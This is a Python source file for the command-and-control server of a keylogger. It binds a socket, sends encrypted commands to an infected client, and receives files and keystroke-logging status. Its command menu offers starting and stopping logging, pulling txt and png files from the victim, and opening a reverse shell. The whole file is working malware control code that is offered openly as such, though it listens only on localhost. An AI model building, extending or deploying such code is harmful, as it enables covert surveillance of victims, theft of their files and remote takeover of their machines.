# -*- coding: utf-8 -*-
import os
import utils
import socket

class CommandAndControl:
    def __init__(self):
        self.host = "127.0.0.1"
        self.port = 1005
        self.sock = socket.socket()

        self.file_path = "files"
        
        self.connect()
        
    def connect(self):
        self.sock.bind((self.host, self.port))
        self.sock.listen(5)
        self.conn, addr = self.sock.accept()
        print('Got connection from', addr)
        
    def close_connection(self):
        self.conn.close()
        
    def send_message_to_client(self, data: str):
        data = data.encode(utils.ENCODING)
        encrypted_data = utils.encrypt(data)
        self.conn.sendall(encrypted_data)
        
    def receive_message_from_client(self):
        recv = self.conn.recv(utils.BUFFSIZE)
        plainbytes = utils.decrypt(recv)
        return plainbytes
        
    def print_usage():
        print("Usage:")
        print("help:        Print this usage message")
        print("activate:    Activate the logging")
        print("deactivate:  Deactivate the logging")
        print("send:        Send txt and png files to the server")
        print("shell:       Activate reverse-shell. Enter \"exit\" to deactivate")
        print("exit:        Terminate server, client will wait for reconnection")
        print("stop:        Terminate client and server")

    def write_file(self, data:bytes, filename:str):
        if not os.path.exists(self.file_path):
            os.makedirs(self.file_path)
        with open(os.path.join(self.file_path, filename), "wb") as file:
            file.write(data)

if __name__ == "__main__":
    reverse_shell_active = False
    command_and_control = CommandAndControl()

    while True:
        if reverse_shell_active:
            inpt = input("shell>")
        else:
            inpt = input("enter command:")
        if inpt:
            if inpt == "help":
                command_and_control.print_usage()
                
            elif inpt == "exit" and not reverse_shell_active:
                print("stopping server")
                break
            else:
                command_and_control.send_message_to_client(inpt)

                recv = command_and_control.receive_message_from_client()
                if recv:
                    header = recv.decode(utils.ENCODING).split("__")

                    if len(header) == 3: # If len is 3, the header contains a filename. In this case its a file and will be handled as one
                        filename, chunk_size, number_of_files_left = header[0], int(header[1]), int(header[2])
                        while number_of_files_left > 0:
                            print("Receiving File:", filename, "chunk_size:", chunk_size)
                            data = b""
                            for i in range(chunk_size):
                                recv = command_and_control.receive_message_from_client()
                                if recv:
                                    data += recv
                            command_and_control.write_file(data=data, filename=filename)
                            number_of_files_left -= 1
                            print("File received,", number_of_files_left, "files left")
                            
                            if number_of_files_left > 0:
                                recv = command_and_control.receive_message_from_client()
                                if recv:
                                    header = recv.decode(utils.ENCODING).split("__")
                                    filename, chunk_size, number_of_files_left = header[0], int(header[1]), int(header[2])

                    elif len(header) == 1: # If len is 1, the header just contains chunk_size and thus will not be converted to a file.
                        chunk_size = int(header[0])
                        msg = b""
                        for i in range(chunk_size):
                            recv = command_and_control.receive_message_from_client()
                            if recv:
                                msg += recv
                        msg = msg.decode(utils.ENCODING)
                            
                        if msg == "keylogger stopped":
                            print("keylogger stopped")
                            break
                        elif msg == "logging activated":
                            print("logging activated")
                        elif msg == "logging deactivated":
                            print("logging deactivated")
                        elif msg == "reverse shell activated":
                            reverse_shell_active = True
                        elif msg == "reverse shell deactivated":
                            reverse_shell_active = False
                        elif msg == "unknown command":
                            print(f"unknown command: {inpt}")
                        else:
                            print(f"unknown answer from client: {msg}")

    command_and_control.close_connection()
    print("good bye")
